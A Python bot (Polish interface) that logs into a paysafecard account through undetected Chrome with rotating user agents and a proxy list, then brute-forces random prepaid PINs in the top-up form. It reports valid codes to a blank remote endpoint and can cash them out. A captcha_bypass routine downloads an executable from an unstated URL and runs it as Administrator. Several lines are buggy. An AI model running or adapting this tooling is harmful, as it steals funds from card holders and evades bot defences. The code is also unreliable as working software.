import undetected_chromedriver as uc
from undetected_chromedriver import Chrome, ChromeOptions
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore as c
import random
import requests
import time
import json
import os
import shutil
import subprocess

def test_chrome():
    print('[CHROME] Sprawdzanie wersji..')
    try:
        driver_path = "chrome/chromedriver.exe"
        proxy = configuration.proxy()
        user_agent = configuration.user_agent()
        options = uc.ChromeOptions()
        # options.add_argument("--headless")
        # options.add_argument(f'--proxy-server={proxy}')
        options.add_argument(f'user-agent={user_agent}')
        driver = uc.Chrome(options=options, executable_path=driver_path)
        driver.get("https://psc-checker.pl")
        driver.quit()
    except Exception as e:
        print(c.RED + 'Zaaktualizuj Chrome`a do nowej wersji lub pobierz nowszą wersję chromedrivera')


def logoo():
    print('                                                                 ')
    print('              █▀█ █▀ █▀▀ ▄▄ █▀▀ █░█ █▀▀ █▀▀ █▄▀ █▀▀ █▀█ ░ █▀█ █░░')
    print('              █▀▀ ▄█ █▄▄ ░░ █▄▄ █▀█ ██▄ █▄▄ █░█ ██▄ █▀▄ ▄ █▀▀ █▄▄')
    print('                    Zalogowano   | v1.0.3 Beta')




class auth_chk():
    def get_auth():
        if configuration.pscapi():
            return configuration.pscapi()
        else:
            print('Nie dodałeś authtoken do configu!')
    def login():
        authtoken = auth_chk.get_auth()
        print(c.LIGHTBLACK_EX + 'Logowanie na psc-checker.pl..')
        resp = requests.get(f'https://psc-checker.pl/', headers={""})
        if 'Logged-in' in resp.text:
            bot_menu()
        else:
            print(c.RED + 'Nie można zalogować się na psc-checker.pl')
            os.system('cls')
            exit()



class configuration():
    def proxy():
        with open('proxies.txt', 'r') as f:
            proxies = f.read().splitlines()

        if proxies:
            random_proxy = random.choice(proxies)
            return random_proxy
        else:
            print("Brak dostępnych proxy w pliku.")
            return None
    def user_agent():
        user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Ubuntu/14.04.6 Chrome/81.0.3990.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.38 Safari/537.36 Brave/75"
        ]
        return random.choice(user_agents)
    def pscapi():
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        auth = config.get('auth')
        return auth
    def cashouter():
        with open('config.json', 'r') as config_file:
            config = json.load(config_file)
        cash = config.get('en_cashouter')
        return cash

    
def bot_menu():
    logo = logoo()
    print(f"{c.LIGHTCYAN_EX} {logo}")
    print(' ')
    print(c.CYAN + '        1. START    2. EXIT     ')
    x = input(':')
    if x == '1':
        os.system('cls')
        bot.start()
    if x == '2':
        os.system('cls')
        exit()

class account():
        with open('acc.txt', 'r') as file:
         lines = file.readlines()

        for line in lines:
            user, password = line.strip().split(':')
        
        user1 = user
        pass1 = password

class psc():
    def getx():
        with open('base.txt', 'r') as f:
            base = f.read().splitlines()
        if base:
            random_base = random.choice(base)
            return random_base
        else:
            print("Brak PSC-Base w pliku base.txt")
            return None
        
    def gen():
        stringpsc = [random.randint(1, 9) for _ in range(6)]
        base = psc.getx()
        fullcode = base + stringpsc
        return fullcode

class bot():
    #def ac():
    #    authtoken = auth_chk.get_auth()
    #    resp = requests.get(f'x', headers={"User-Agent": ''})
    #    if 'active' in resp.text:
    #        bot.contin()
    #    else:
    #        print(c.LIGHTRED_EX + 'Jesteś zalogowany na koncie psc-checker.pl, jednak nie masz wykupionego dostępu. Zrób to tutaj: https://psc-checker.pl/dostep.php')
    #        input()
    #        os.system('cls')
    def start():
        logo = logoo()
        print(f"{c.LIGHTCYAN_EX} {logo}")
        #bot.ac()
        bot.contin()
    def contin():
        session.login()
        session.fa()
        os.system('cls')
        logo = logoo()
        print(f"{c.LIGHTCYAN_EX} {logo}")
        print('Podaj ile kodów chcesz stworzyć i sprawdzić: ')
        amount = input(int())
        for _ in range(amount):
            session.check_psc()
    
def captcha_bypass():
    nazwa_pliku = "no_bot.exe"
    if os.path.exists(nazwa_pliku):
    
        subprocess.run(["runas", "/user:Administrator", nazwa_pliku])
    else:
    
        url_pobrania = ""
        response = requests.get(url_pobrania, stream=True)

    
        with open(nazwa_pliku, 'wb') as plik:
            shutil.copyfileobj(response.raw, plik)

        
        subprocess.run(["runas", "/user:Administrator", nazwa_pliku])


class session():
    driver_path = "chrome/chromedriver.exe"
    proxy = configuration.proxy()
    user_agent = configuration.user_agent()
    options = uc.ChromeOptions()
    # options.add_argument("--headless")
    # options.add_argument(f'--proxy-server={proxy}')
    options.add_argument(f'user-agent={user_agent}')
    driver = uc.Chrome(options=options, executable_path=driver_path)
    def login():
            username = account.user1
            password = account.pass1
            session.driver.get('https://login.paysafecard.com/customer-auth/?client_id=mypinsPR&theme=mypins&locale=pl_PL&info_msg_key=info.session_timeout_logout_msg&redirect_uri=https%3A%2F%2Fmy.paysafecard.com%2Fmypins-psc%2FtokenExchange.xhtml')
            time.sleep(4.5)
            print(c.WHITE + '[PAYSAFECARD.com] Próba logowania..')
            username_field = session.driver.find_element(By.ID, "username")
            username_field.send_keys(username)
            password_field = session.driver.find_element(By.ID, "password")
            password_field.send_keys(password)


            login_button = session.driver.find_element(By.ID, "loginButton")
            login_button.click()

    def fa():
        username = account.user1
        password = account.pass1
        WebDriverWait(session.driver, 4)
        login_button = session.driver.find_element(By.ID, "setupFallbackButton")
        login_button.click()
        facode = input(c.WHITE + '[@2fa] Podaj kod, który otrzymałeś SMSem: ')
        facode_field = session.driver.find_element(By.ID, "smsCodeField")
        facode_field.send_keys(facode)
        send_button = session.driver.find_element(By.ID, "smsConfirmButton")
        send_button.click()
        print(c.GREEN + f'[sesja] Zalogowano na konto: {username}:{password}')
        WebDriverWait(session.driver, 4)


    def check_psc():
        code_input = session.driver.find_element(By.ID, "topup:pin")
        print(c.LIGHTWHITE_EX + '[Generator] ' + c.WHITE + 'Generowanie kodu..')
        psccode = psc.gen()
        code_input.send_keys(psccode)
        print(c.LIGHTWHITE_EX + '[paysafecard.com] ' + c.WHITE + 'Sprawdzanie kodu..')
        time.sleep(0.8)
        try:
            error_element = session.driver.find_element(By.ID, "topup:card-balance-error")
            wynik = "Nieprawidłowa"
        except:
            wynik = "Prawidłowa"
        time.sleep(0.01)
        if wynik == 'Prawidłowa':
            print(c.LIGHTWHITE_EX + '[paysafecard.com] ' + c.WHITE + f'Karta {c.LIGHTWHITE_EX} {psccode} {c.WHITE} jest {c.GREEN} prawidłowa {c.WHITE}, sprawdź jej balans tutaj: https://paysafecard.com/pl/sprawdzanie-dostepnych-srodkow')
            requests.post('', json={"code:" f"{psccode}"} )
            if cashout == "yes":
                code_input.send_keys(Keys.ENTER)
        else:
            print(c.LIGHTWHITE_EX + '[paysafecard.com] ' + c.WHITE + f'Wprowadzony PIN {c.LIGHTWHITE_EX} ({psccode}) {c.WHITE} jest {c.RED} nieprawidłowy. {c.WHITE} Spróbuj ponownie.')
        cashout = configuration.cashouter()

        time.sleep(1.2)

if __name__ == "__main__":
    uc.install()
    #auth_chk.get_auth()
    #auth_chk.login()
    #captcha_bypass()
    test_chrome()
    os.system('cls')
    bot_menu()

